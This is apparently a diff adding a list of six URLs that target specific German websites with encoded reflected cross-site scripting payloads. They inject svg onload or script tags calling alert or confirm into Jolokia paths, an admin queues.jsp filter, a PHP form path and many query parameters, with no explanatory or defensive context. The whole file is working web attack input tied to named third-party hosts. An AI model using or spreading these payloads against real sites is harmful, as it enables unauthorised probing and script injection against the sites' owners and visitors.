@@ -1,0 +1,6 @@
+http://australien-erlebnisreisen.de/api/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+http://australien-studienreisen.de/calendar_form.php/%22%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3E
+http://autodiscover.hk-mueller.de/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+http://autojet.de/admin/queues.jsp?QueueFilter=yu1ey%22%3e%3cscript%3ealert(%221%22)%3c%2fscript%3eqb68
+http://auto-leasen.de/?month=%27%3E%22%3Csvg%2Fonload=confirm%28%27month%27%29%3E&page_id=%27%3E%22%3Csvg%2Fonload=confirm%28%27page_id%27%29%3E&password=%27%3E%22%3Csvg%2Fonload=confirm%28%27password%27%29%3E&terms=%27%3E%22%3Csvg%2Fonload=confirm%28%27terms%27%29%3E&token=%27%3E%22%3Csvg%2Fonload=confirm%28%27token%27%29%3E&type=%27%3E%22%3Csvg%2Fonload=confirm%28%27type%27%29%3E&unsubscribe_token=%27%3E%22%3Csvg%2Fonload=confirm%28%27unsubscribe_token%27%29%3E&year=%27%3E%22%3Csvg%2Fonload=confirm%28%27year%27%29%3E
+http://automobil-lexikon.de/?key=%27%3E%22%3Csvg%2Fonload=confirm%28%27xss%27%29%3E
